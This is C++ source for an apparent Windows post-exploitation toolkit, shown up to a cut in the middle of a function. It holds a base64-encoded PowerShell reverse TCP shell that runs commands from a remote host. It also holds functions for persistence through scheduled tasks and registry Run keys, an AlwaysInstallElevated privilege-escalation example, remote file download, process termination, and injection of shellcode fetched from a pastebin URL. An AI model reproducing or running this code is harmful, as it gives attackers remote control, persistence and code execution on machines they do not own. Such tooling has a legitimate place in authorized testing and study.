#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#include <windows.h>
#include <iostream>
#include <fstream>
#include ".\headers\base64\base64.cpp"
#include ".\headers\base64\base64.h"
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#include <tlhelp32.h>

void systemInvokeCMD() {
	printf("\n");
	system("CMD");
}

void systemInvokePS() {
	printf("\n");
	system("PowerShell -ExecutionPolicy Unrestricted -NoProfile");
}

void wordInvokePS() {
	// Microsoft Word macro-enabled document encoded in Base64
	std::string encoded = "
	std::string decoded = base64_decode(encoded);
	std::ofstream stream("invoker.doc", std::ios::binary);
	if (stream.fail()) {
		printf("\nUnable to create the file \"invoker.docm\"\n\n");
	} else {
		stream << decoded;
		printf("\nFile \"invoker.docm\" was created successfully\n\n");
	}
	stream.close();
	stream.clear();
	system("Pause");
}

void psExec(std::string encoded) {
	std::string command = "PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand " + encoded;
	printf("\n");
	system(command.c_str());
	printf("\n");
	system("Pause");
}

void psReverseTCP() {
	// PowerShell script encoded in Unicode then in Base64
	std::string encoded = "JABhAGQAZAByACAAPQAgAFIAZQBhAGQALQBIAG8AcwB0ACAAIgBFAG4AdABlAHIAIABJAFAAIABhAGQAZAByAGUAcwBzACIAOwANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgA7AA0ACgAkAHAAbwByAHQAIAA9ACAAUgBlAGEAZAAtAEgAbwBzAHQAIAAiAEUAbgB0AGUAcgAgAHAAbwByAHQAIABuAHUAbQBiAGUAcgAiADsADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACIAOwANAAoAaQBmACAAKAAkAGEAZABkAHIALgBMAGUAbgBnAHQAaAAgAC0AbAB0ACAAMQAgAC0AbwByACAAJABwAG8AcgB0AC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAKQAgAHsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQgBvAHQAaAAgAHAAYQByAGEAbQBlAHQAZQByAHMAIABhAHIAZQAgAHIAZQBxAHUAaQByAGUAZAAiADsADQAKAH0AIABlAGwAcwBlACAAewANAAoACQAkAHMAbwBjAGsAZQB0ACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAcwB0AHIAZQBhAG0AIAA9ACAAJABuAHUAbABsADsADQAKAAkAJABiAHUAZgBmAGUAcgAgAD0AIAAkAG4AdQBsAGwAOwANAAoACQAkAHcAcgBpAHQAZQByACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAcgBlAGEAZAAgAD0AIAAkAG4AdQBsAGwAOwANAAoACQAkAGQAYQB0AGEAIAA9ACAAJABuAHUAbABsADsADQAKAAkAJAByAGUAcwB1AGwAdAAgAD0AIAAkAG4AdQBsAGwAOwANAAoACQB0AHIAeQAgAHsADQAKAAkACQAjACAAYwBoAGEAbgBnAGUAIAB0AGgAZQAgAGgAbwBzAHQAIABhAGQAZAByAGUAcwBzACAAYQBuAGQALwBvAHIAIABwAG8AcgB0ACAAbgB1AG0AYgBlAHIAIABhAHMAIABuAGUAYwBlAHMAcwBhAHIAeQANAAoACQAJACQAcwBvAGMAawBlAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAYwBwAEMAbABpAGUAbgB0ACgAJABhAGQAZAByACAALAAgACQAcABvAHIAdAApADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAiADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwAiADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABSAGUAdgBlAHIAcwBlACAAVABDAFAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwAiADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAeQAgAEkAdgBhAG4AIABTAGkAbgBjAGUAawAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwAiADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwAiADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAARwBpAHQASAB1AGIAIAByAGUAcABvAHMAaQB0AG8AcgB5ACAAYQB0ACAAZwBpAHQAaAB1AGIALgBjAG8AbQAvAGkAdgBhAG4ALQBzAGkAbgBjAGUAawAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALQByAGUAdgBlAHIAcwBlAC0AdABjAHAALgAgACAAIwAiADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAARgBlAGUAbAAgAGYAcgBlAGUAIAB0AG8AIABkAG8AbgBhAHQAZQAgAGIAaQB0AGMAbwBpAG4AIABhAHQAIAAxAEIAcgBaAE0ANgBUADcARwA5AFIATgA4AHYAYgBhAGIAbgBmAFgAdQA0AE0ANgBMAHAAZwB6AHQAcQA2AFkAMQA0AC4AIAAgACAAIwAiADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwAiADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAiADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBCAGEAYwBrAGQAbwBvAHIAIABpAHMAIAB1AHAAIABhAG4AZAAgAHIAdQBuAG4AaQBuAGcALgAuAC4AIgA7AA0ACgAJAAkAJABzAHQAcgBlAGEAbQAgAD0AIAAkAHMAbwBjAGsAZQB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsADQAKAAkACQAkAGIAdQBmAGYAZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABCAHkAdABlAFsAXQAgADEAMAAyADQAOwANAAoACQAJACQAZQBuAGMAbwBkAGkAbgBnACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABUAGUAeAB0AC4AQQBzAGMAaQBpAEUAbgBjAG8AZABpAG4AZwA7AA0ACgAJAAkAJAB3AHIAaQB0AGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHMAdAByAGUAYQBtACkAOwANAAoACQAJACQAdwByAGkAdABlAHIALgBBAHUAdABvAEYAbAB1AHMAaAAgAD0AIAAkAHQAcgB1AGUAOwANAAoACQAJAGQAbwAgAHsADQAKAAkACQAJACQAdwByAGkAdABlAHIALgBXAHIAaQB0AGUAKAAiAFAAUwA+ACIAKQA7AA0ACgAJAAkACQBkAG8AIAB7AA0ACgAJAAkACQAJACQAcgBlAGEAZAAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB1AGYAZgBlAHIALAAgADAALAAgACQAYgB1AGYAZgBlAHIALgBMAGUAbgBnAHQAaAApADsADQAKAAkACQAJAAkAaQBmACAAKAAkAHIAZQBhAGQAIAAtAGcAdAAgADAAKQAgAHsADQAKAAkACQAJAAkACQAkAGQAYQB0AGEAIAA9ACAAJABkAGEAdABhACAAKwAgACQAZQBuAGMAbwBkAGkAbgBnAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAHIAZQBhAGQAKQAuAFIAZQBwAGwAYQBjAGUAKAAiAGAAcgBgAG4AIgAsACAAIgAiACkALgBSAGUAcABsAGEAYwBlACgAIgBgAG4AIgAsACAAIgAiACkAOwANAAoACQAJAAkACQB9ACAAZQBsAHMAZQAgAHsADQAKAAkACQAJAAkACQAkAGQAYQB0AGEAIAA9ACAAIgBlAHgAaQB0ACIAOwANAAoACQAJAAkACQB9AA0ACgAJAAkACQB9ACAAdwBoAGkAbABlACAAKAAkAHMAdAByAGUAYQBtAC4ARABhAHQAYQBBAHYAYQBpAGwAYQBiAGwAZQApADsADQAKAAkACQAJAGkAZgAgACgAJABkAGEAdABhACAALQBuAGUAIAAiACIAIAAtAGEAbgBkACAAJABkAGEAdABhACAALQBuAGUAIAAiAGUAeABpAHQAIgApACAAewANAAoACQAJAAkACQB0AHIAeQAgAHsADQAKAAkACQAJAAkACQAkAHIAZQBzAHUAbAB0ACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABkAGEAdABhACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7AA0ACgAJAAkACQAJAH0AIABjAGEAdABjAGgAIAB7AA0ACgAJAAkACQAJAAkAJAByAGUAcwB1AGwAdAAgAD0AIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwANAAoACQAJAAkACQB9AA0ACgAJAAkACQAJACQAdwByAGkAdABlAHIALgBXAHIAaQB0AGUATABpAG4AZQAoACQAcgBlAHMAdQBsAHQAKQA7AA0ACgAJAAkACQAJAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0AbgBhAG0AZQAgACIAZABhAHQAYQAiADsADQAKAAkACQAJAH0ADQAKAAkACQB9ACAAdwBoAGkAbABlACAAKAAkAGQAYQB0AGEAIAAtAG4AZQAgACIAZQB4AGkAdAAiACkAOwANAAoACQB9ACAAYwBhAHQAYwBoACAAewANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwANAAoACQB9ACAAZgBpAG4AYQBsAGwAeQAgAHsADQAKAAkACQBpAGYAIAAoACQAcwBvAGMAawBlAHQAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAJABzAG8AYwBrAGUAdAAuAEMAbABvAHMAZQAoACkAOwANAAoACQAJAAkAJABzAG8AYwBrAGUAdAAuAEQAaQBzAHAAbwBzAGUAKAApADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAHMAdAByAGUAYQBtACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJACQAcwB0AHIAZQBhAG0ALgBDAGwAbwBzAGUAKAApADsADQAKAAkACQAJACQAcwB0AHIAZQBhAG0ALgBEAGkAcwBwAG8AcwBlACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJABiAHUAZgBmAGUAcgAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AA0ACgAJAAkACQAkAGIAdQBmAGYAZQByAC4AQwBsAGUAYQByACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJAB3AHIAaQB0AGUAcgAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AA0ACgAJAAkACQAkAHcAcgBpAHQAZQByAC4AQwBsAG8AcwBlACgAKQA7AA0ACgAJAAkACQAkAHcAcgBpAHQAZQByAC4ARABpAHMAcABvAHMAZQAoACkAOwANAAoACQAJAH0ADQAKAAkACQBpAGYAIAAoACQAcgBlAGEAZAAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AA0ACgAJAAkACQBDAGwAZQBhAHIALQBWAGEAcgBpAGEAYgBsAGUAIAAtAG4AYQBtAGUAIAAiAHIAZQBhAGQAIgA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJABkAGEAdABhACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0AbgBhAG0AZQAgACIAZABhAHQAYQAiADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAHIAZQBzAHUAbAB0ACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0AbgBhAG0AZQAgACIAcgBlAHMAdQBsAHQAIgA7AA0ACgAJAAkAfQANAAoACQB9AA0ACgB9AA0ACgA=";
	// more about the script at github.com/ivan-sincek/powershell-reverse-tcp
	psExec(encoded);
}

void psScheduleTask() {
	system("CLS");
	printf("############################## EXAMPLES ##############################\n");
	printf("# Name: Malware                                                      #\n");
	printf("# Time: 15:00                                                        #\n");
	printf("# User: Kira                                                         #\n");
	printf("# File: C:\\Users\\Kira\\Downloads\\malware.exe                          #\n");
	printf("######################################################################\n");
	// PowerShell script encoded in Unicode then in Base64
	std::string encoded = "JABuAGEAbQBlACAAPQAgAFIAZQBhAGQALQBIAG8AcwB0ACAAIgBFAG4AdABlAHIAIAB0AGEAcwBrACAAbgBhAG0AZQAiADsADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACIAOwANAAoAJAB0AGkAbQBlACAAPQAgAFIAZQBhAGQALQBIAG8AcwB0ACAAIgBFAG4AdABlAHIAIAB0AGEAcwBrACAAZQB4AGUAYwB1AHQAaQBvAG4AIAB0AGkAbQBlACIAOwANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgA7AA0ACgAkAHUAcwBlAHIAIAA9ACAAUgBlAGEAZAAtAEgAbwBzAHQAIAAiAEUAbgB0AGUAcgAgAHUAcwBlAHIAIABuAGEAbQBlACIAOwANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgA7AA0ACgAkAGYAaQBsAGUAIAA9ACAAUgBlAGEAZAAtAEgAbwBzAHQAIAAiAEUAbgB0AGUAcgAgAGYAaQBsAGUAIgA7AA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsADQAKACQAYQByAGcAdQBtAGUAbgB0ACAAPQAgAFIAZQBhAGQALQBIAG8AcwB0ACAAIgBFAG4AdABlAHIAIABhAHIAZwB1AG0AZQBuAHQAcwAgACgAbwBwAHQAaQBvAG4AYQBsACkAIgA7AA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsADQAKAGkAZgAgACgAJABuAGEAbQBlAC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAIAAtAG8AcgAgACQAdABpAG0AZQAuAEwAZQBuAGcAdABoACAALQBsAHQAIAAxACAALQBvAHIAIAAkAHUAcwBlAHIALgBMAGUAbgBnAHQAaAAgAC0AbAB0ACAAMQAgAC0AbwByACAAJABmAGkAbABlAC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAKQAgAHsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAUgBlAHEAdQBpAHIAZQBkACAAcABhAHIAYQBtAGUAdABlAHIAcwAgAGEAcgBlACAAbQBpAHMAcwBpAG4AZwAiADsADQAKAH0AIABlAGwAcwBlACAAewANAAoACQB0AHIAeQAgAHsADQAKAAkACQAkAGUAeABpAHMAdABzACAAPQAgAEcAZQB0AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAHwAIABXAGgAZQByAGUALQBPAGIAagBlAGMAdAAgAHsAIAAkAF8ALgBUAGEAcwBrAE4AYQBtAGUAIAAtAGUAcQAgACQAbgBhAG0AZQAgAH0AOwANAAoACQAJAGkAZgAgACgAJABlAHgAaQBzAHQAcwAgAC0AZQBxACAAJAB0AHIAdQBlACkAIAB7AA0ACgAJAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBTAGMAaABlAGQAdQBsAGUAZAAgAHQAYQBzAGsAIABhAGwAcgBlAGEAZAB5ACAAZQB4AGkAcwB0AHMAIgA7AA0ACgAJAAkAfQAgAGUAbABzAGUAIAB7AA0ACgAJAAkACQAkAHQAcgBpAGcAZwBlAHIAIAA9ACAATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFQAcgBpAGcAZwBlAHIAIAAtAEEAdAAgACQAdABpAG0AZQAgAC0ATwBuAGMAZQA7AA0ACgAJAAkACQAkAGEAYwB0AGkAbwBuACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJAAkACQBpAGYAIAAoACQAYQByAGcAdQBtAGUAbgB0ACAALQBlAHEAIAAiACIAKQAgAHsADQAKAAkACQAJAAkAJABhAGMAdABpAG8AbgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIAAkAGYAaQBsAGUAOwANAAoACQAJAAkAfQAgAGUAbABzAGUAIAB7AA0ACgAJAAkACQAJACQAYQBjAHQAaQBvAG4AIAA9ACAATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAEEAYwB0AGkAbwBuACAALQBFAHgAZQBjAHUAdABlACAAJABmAGkAbABlACAALQBBAHIAZwB1AG0AZQBuAHQAIAAkAGEAcgBnAHUAbQBlAG4AdAA7AA0ACgAJAAkACQB9AA0ACgAJAAkACQAkAHIAZQBzAHUAbAB0ACAAPQAgAFIAZQBnAGkAcwB0AGUAcgAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAIAAtAFQAYQBzAGsATgBhAG0AZQAgACQAbgBhAG0AZQAgAC0AVAByAGkAZwBnAGUAcgAgACQAdAByAGkAZwBnAGUAcgAgAC0AVQBzAGUAcgAgACQAdQBzAGUAcgAgAC0AQQBjAHQAaQBvAG4AIAAkAGEAYwB0AGkAbwBuACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsADsADQAKAAkACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFMAYwBoAGUAZAB1AGwAZQBkACAAdABhAHMAawAgAHcAYQBzACAAYQBkAGQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIgA7AA0ACgAJAAkAfQANAAoACQB9ACAAYwBhAHQAYwBoACAAewANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwANAAoACQB9AA0ACgB9AA0ACgA=";
	psExec(encoded);
}

void psDownloadFile() {
	// PowerShell script encoded in Unicode then in Base64
	std::string encoded = "JAB1AHIAbAAgAD0AIABSAGUAYQBkAC0ASABvAHMAdAAgACIARQBuAHQAZQByACAAVQBSAEwAIgA7AA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsADQAKACQAbwB1AHQAIAA9ACAAUgBlAGEAZAAtAEgAbwBzAHQAIAAiAEUAbgB0AGUAcgAgAG8AdQB0AHAAdQB0ACAAZgBpAGwAZQAgAG4AYQBtAGUAIgA7AA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsADQAKAGkAZgAgACgAJAB1AHIAbAAuAEwAZQBuAGcAdABoACAALQBsAHQAIAAxACAALQBvAHIAIAAkAG8AdQB0AC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAKQAgAHsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQgBvAHQAaAAgAHAAYQByAGEAbQBlAHQAZQByAHMAIABhAHIAZQAgAHIAZQBxAHUAaQByAGUAZAAiADsADQAKAH0AIABlAGwAcwBlACAAewANAAoACQAkAGMAbABpAGUAbgB0ACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJAHQAcgB5ACAAewANAAoACQAJACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwANAAoACQAJACQAYwBsAGkAZQBuAHQALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAdQByAGwALAAgACQAbwB1AHQAKQA7AA0ACgAJAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIARgBpAGwAZQAgAHcAYQBzACAAZABvAHcAbgBsAG8AYQBkAGUAZAAgAHMAdQBjAGMAZQBzAHMAZgB1AGwAbAB5ACIAOwANAAoACQB9ACAAYwBhAHQAYwBoACAAewANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwANAAoACQB9ACAAZgBpAG4AYQBsAGwAeQAgAHsADQAKAAkACQBpAGYAIAAoACQAYwBsAGkAZQBuAHQAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAJABjAGwAaQBlAG4AdAAuAEQAaQBzAHAAbwBzAGUAKAApADsADQAKAAkACQB9AA0ACgAJAH0ADQAKAH0ADQAKAA==";
	psExec(encoded);
}

void cppDownloadFile() {
	std::string url = "";
	printf("\nEnter URL: ");
	getline(std::cin, url);
	std::string out = "";
	printf("\nEnter output file: ");
	getline(std::cin, out);
	if (url == "" || out == "") {
		printf("\nBoth parameters are required\n\n");
	} else {
		HRESULT hr = URLDownloadToFile(NULL, url.c_str(), out.c_str(), 0, NULL);
		if (hr == S_OK) {
			printf("\nFile was downloaded successfully\n\n");
		} else {
			printf("\nUnable to download the file\n\n");
		}
	}
	system("Pause");
}

void cppAddRegistryKey() {
	std::string choice = "";
	do {
		system("CLS");
		printf("############################## EXAMPLES ##############################\n");
		printf("# Hive:  HKEY_CURRENT_USER | HKEY_LOCAL_MACHINE                      #\n");
		printf("# Path:  Software\\Microsoft\\Windows\\CurrentVersion\\Run               #\n");
		printf("# Name:  PowerShell                                                  #\n");
		printf("# Value: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe   #\n");
		printf("######################################################################\n");
		printf("# Hive:  HKEY_CURRENT_USER | HKEY_LOCAL_MACHINE                      #\n");
		printf("# Path:  Software\\Policies\\Microsoft\\Windows\\Installer               #\n");
		printf("# Name:  AlwaysInstallElevated                                       #\n");
		printf("# Value: 1                                                           #\n");
		printf("######################################################################\n");
		printf("\n");
		printf("########################### REGISTRY HIVES ###########################\n");
		printf("# (1) HKEY_CLASSES_ROOT                                              #\n");
		printf("# (2) HKEY_CURRENT_USER                                              #\n");
		printf("# (3) HKEY_LOCAL_MACHINE                                             #\n");
		printf("# (4) HKEY_USERS                                                     #\n");
		printf("# (5) HKEY_CURRENT_CONFIG                                            #\n");
		printf("######################################################################\n");
		printf("# (0) Back                                                           #\n");
		printf("######################################################################\n");
		printf("Enter registry hive: ");
		getline(std::cin, choice);
		HKEY hKey = NULL;
		if (choice == "1") {
			hKey = HKEY_CLASSES_ROOT;
		} else if (choice == "2") {
			hKey = HKEY_CURRENT_USER;
		} else if (choice == "3") {
			hKey = HKEY_LOCAL_MACHINE;
		} else if (choice == "4") {
			hKey = HKEY_USERS;
		} else if (choice == "5") {
			hKey = HKEY_CURRENT_CONFIG;
		}
		if (hKey != NULL) {
			std::string keyPath = "";
			printf("\nEnter key path: ");
			getline(std::cin, keyPath);
			std::string keyName = "";
			printf("\nEnter key name: ");
			getline(std::cin, keyName);
			std::string keyValue = "";
			printf("\nEnter key value: ");
			getline(std::cin, keyValue);
			std::string confirm = "";
			printf("\nConfirm entry (yes): ");
			getline(std::cin, confirm);
			if (confirm == "yes") {
				bool set = false;
				if (RegCreateKeyEx(hKey, keyPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
					if (RegSetValueEx(hKey, keyName.c_str(), 0, REG_SZ, (LPBYTE) keyValue.c_str(), strlen(keyValue.c_str()))  == ERROR_SUCCESS) {
						set = true;
					}
				}
				RegCloseKey(hKey);
				printf(set ? "\nRegistry key was added successfully\n\n" : "\nUnable to add the registry key\n\n");
				system("Pause");
			}
		}
	} while (choice != "0");
}

int getProcessID() {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE list = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	bool exists = false;
	if (list == INVALID_HANDLE_VALUE || snapshot == INVALID_HANDLE_VALUE) {
		printf("\nUnable to create the snapshot of current processes\n");
	} else {
		system("CLS");
		printf("############################ PROCESS LIST ############################\n");
		while (Process32Next(list, &entry)) {
			printf("# %-6d   %-*.*s #\n", entry.th32ProcessID, 57, 57, entry.szExeFile);
		}
		printf("######################################################################\n");
		printf("Enter proccess ID: ");
		std::string id = "";
		getline(std::cin, id);
		if (id == "") {
			printf("\nProcess ID is rquired\n\n");
		} else if (!atoi(id.c_str())) {
			printf("\nProcess ID must be numeric\n\n");
		} else {
			std::string confirm = "";
			printf("\nConfirm entry (yes): ");
			getline(std::cin, confirm);
			if (confirm == "yes") {
				while (Process32Next(snapshot, &entry)) {
					if (entry.th32ProcessID == atoi(id.c_str())) {
						exists = true;
						break;
					}
				}
				if (!exists) {
					printf("\nProcess ID does not exists\n\n");
				}
			}
		}
	}
	CloseHandle(list);
	CloseHandle(snapshot);
	return exists ? entry.th32ProcessID : -1;
}

void cppTerminateProcess() {
	int id = getProcessID();
	if (id != -1) {
		HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, false, id);
		if (hProcess == NULL) {
			printf("\nUnable to get the process handle\n\n");
		} else if (TerminateProcess(hProcess, 0) == 0) {
			printf("\nUnable to terminate the process\n\n");	
		} else {
			printf("\nProcess was terminated successfully\n\n");
		}
		CloseHandle(hProcess);
	}
	system("Pause");
}

void cppInjectBytecode() {
	// download bytecode
	std::string data = "";
	system("CLS");
	printf("############################## EXAMPLES ##############################\n");
	printf("# URL:  pastebin.com/raw/Nd1tCBv6                                    #\n");
	printf("# Port: 80                                                           #\n");
	printf("######################################################################\n");
	std::string url = "";
	printf("\nEnter URL: ");
	getline(std::cin, url);
	std::size_t position = url.find("://");
	if (position != std::string::npos) {
		url = url.erase(0, position + 3);
	}
	std::string host = "";
	std::string path = "";
	position = url.find("/");
	if (position != std::string::npos) {
		host = url.substr(0, position);
		path = url.substr(position);
	}
	std::string port = "";
	printf("\nEnter port number: ");
	getline(std::cin, port);
	if (url == "" || port == "") {
		printf("\nBoth parameters are required\n\n");
	} else if (!atoi(port.c_str())) {
		printf("\nPort number must be numeric\n\n");
	} else {
		WSADATA wsaData;
		if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
			printf("\nUnable to initiate the use of Winsock DLL\n\n");
		} else {
			SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
			if (s == INVALID_SOCKET) {
				printf("\nUnable to create the connection socket\n\n");
			} else {
				hostent *h = gethostbyname(host.c_str());
				if (h == NULL) {
					printf("\nUnable to resolve the server IP address\n\n");
				} else {
					struct sockaddr_in server;
					server.sin_family = AF_INET;
					server.sin_addr = *((struct in_addr *) h->h_addr);
					server.sin_port = htons(atoi(port.c_str()));
					if (connect(s, (struct sockaddr *) &server, sizeof(server)) != 0) {
						printf("\nUnable to connect to the server\n\n");
					} else {
						std::string request = "GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n";
						send(s, request.c_str(), strlen(request.c_str()), 0);
						int bytes = 0;
						char buffer[1024];
						do {
							bytes = recv(s, buffer, sizeof(buffer), 0);
							data.append(buffer, bytes);
						} while (bytes != 0);
						memset(&buffer, 0, sizeof(buffer));
						// extract bytecode from an image element
						std::size_t p1 = data.find("<img class=\"bc\" src=\"data:image/gif;base64,");
						if (p1 != std::string::npos) {
							data = data.substr(p1 + 43);
						}
						std::size_t p2 = data.rfind("\" alt=\"bc\" hidden=\"hidden\">");
